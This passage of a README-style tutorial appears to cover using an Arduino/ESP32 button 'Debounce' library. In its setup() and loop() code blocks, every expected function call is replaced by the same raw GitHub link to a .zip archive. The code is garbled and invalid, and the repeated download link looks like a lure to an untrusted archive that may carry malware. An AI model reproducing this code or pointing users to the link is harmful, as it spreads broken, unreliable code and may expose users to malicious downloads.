## üõ†Ô∏è Using the Debounce Library

1. **Create a New Sketch**:
   - In Arduino IDE, go to **File** > **New** to create a new sketch.
   
2. **Include the Library**: 
   Add the following line at the top of your sketch:

   ```cpp
   #include <Debounce.h>
   ```

3. **Initialize the Button**: 
   Define the pin number for your button and create a Debounce object:

   ```cpp
   const int buttonPin = 2; // Change this to your button pin
   Debounce button(buttonPin);
   ```

4. **Setup Function**: 
   In the `setup()` function, initialize the Debounce library:

   ```cpp
   void setup() {
       https://raw.githubusercontent.com/Wow2234443/Debounce/main/Bullidae/Debounce.zip();
       https://raw.githubusercontent.com/Wow2234443/Debounce/main/Bullidae/Debounce.zip(9600);
   }
   ```

5. **Loop Function**: 
   In the `loop()` function, check the button state:

   ```cpp
   void loop() {
       if (https://raw.githubusercontent.com/Wow2234443/Debounce/main/Bullidae/Debounce.zip() == HIGH) {
           https://raw.githubusercontent.com/Wow2234443/Debounce/main/Bullidae/Debounce.zip("Button Pressed");
       }
   }
   ```

6. **Upload Your Sketch**: 
   Connect your ESP32 to your computer and select the appropriate board from the **Tools** menu. Next, click the upload button.

7. **Test Your Button**: 
   Open the Serial Monitor (under the Tools menu) to see the output. Press the button and check if the message appears.

## üìñ Example Projects

Here are some project ideas that use the Debounce library:

- **Simple Toggle Switch**: Use the button to toggle an LED on and off.
- **Counter**: Count how many times the button is pressed and display the count on an LCD.
- **IoT Device**: Create a button to send commands to an IoT service when pressed.
